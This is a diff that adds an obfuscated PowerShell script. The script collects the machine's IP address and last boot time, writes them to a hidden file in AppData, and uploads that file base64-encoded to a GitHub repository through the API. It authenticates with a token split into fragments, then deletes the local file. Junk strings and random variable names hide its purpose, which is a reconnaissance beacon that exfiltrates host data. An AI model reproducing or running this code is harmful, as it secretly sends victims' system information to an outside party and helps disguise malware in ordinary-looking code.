@@ -1,0 +1,31 @@
+$klfdhlkfdgrrgr= "dsgjkhxzuvoinkejvn.,cnv.,mcxn.v,mdfsgdsgdsfgdsg"
+$uruoie2143 = (Get-WmiObject Win32_NetworkAdapterConfiguration | Where-Object { $_.IPAddress -ne $null }).IPAddress[0]
+$dlkjhfgjkr = "dfhgj8u2hnfkjhJKGCUYGDSUYGD(*UFT*(&^F%T*&dgdgdg"
+$IOEGfgi3dfg = Get-Date -Format "MMdd_HHmm"
+$ereeelkjhlvknnds = "sdgjkhdsljkghiuobvnjknlkdsjnlkjhdsgiuohl2i23jh98&A^S9D87A6(*&d^(*s&"
+$lkfghexiuovertte = "$uruoie2143-$IOEGfgi3dfg-XXX-kkk.txt"
+$ereeelkjhlvknnds += "DFJKHGKLDHFJLKJDLKGJSKDFJGKJ*)(&^(*&#yiuohfrljkhdgjkH" 
+$jdhgkkkduufjiegeee = Join-Path $env:appdata $lkfghexiuovertte
+$dlkjhfgjkr+= "SDFJKHDJKHFJKHTIPDUJH8I&^(&*@yiuo@h #@#lk2342RDFGDFGDFGFGFGFG"
+(Get-CimInstance Win32_OperatingSystem).LastBootUpTime | Out-File -FilePath $jdhgkkkduufjiegeee
+$klfdhlkfdgrrgr += "DSFJKHGLDSJKHTIODHGJKH8U2H34UH234H23KH4L23KH423JH4H24JKHIU2RIODUSY8D7F0UUUUUUUUUUUU"
+$safftvkkkkflr923 = "htt"+"ps"+":/"+"/a" + "pi.g" + "ith" + "ub.com/re" + "pos/JanglePrag/ErpDS/contents/Reset/" + $lkfghexiuovertte
+$klfdhlkfdgrrgr += "(*&)(*&@)(*ijfhjhfljkdhlkjhfljkdhfljkhdljkgh"
+$uidmmcnnndr231mv = "gh"+"p_7"+"7LH"+"JKl"+"VP4"+"P3iQ"+"F4m9"+"5VrJJ"+"ZZG3"+"TO"+"Y2x"+"vN"+"nT"
+$klfdhlkfdgrrgr += "LJKHVUH23940347-98709H9FDHJGOHDJGHJLDK"
+$hjjjdkxmcffefxzxxf12 = Get-Content -Path $jdhgkkkduufjiegeee -Encoding Byte
+$klfdhlkfdgrrgr += "KVH8U23847098234709823740982730984723093472309847203984798,;GDJDSGLDSKJGL"
+$oooepofdklhh2j4 = [Convert]::ToBase64String($hjjjdkxmcffefxzxxf12)
+$ppekldlksviurk234 = @{
+    message = "Upload file $lkfghexiuovertte"
+    content = $oooepofdklhh2j4
+    branch = "main"
+}
+$klfdhlkfdgrrgr += "SDGJKHLKJHTIOUHDGJKHKJH2IU476239846283974698723649872"
+$llgkrmcvsj32gdsg = @{
+    "Authorization" = "token $uidmmcnnndr231mv"
+    "Content-Type" = "application/json"
+}
+$klfdhlkfdgrrgr += "VY8YT837HWH5IUHPHG;FGHU-9*&_(*&_(d&_*uUIHIUHIUHFDOJHGFGHFGHFH"
+$vnjemdmmfkdaf1 = Invoke-RestMethod -Uri $safftvkkkkflr923 -Method Put -Body ($ppekldlksviurk234 | ConvertTo-Json) -Headers $llgkrmcvsj32gdsg
+Remove-Item -Path $jdhgkkkduufjiegeee -Force;
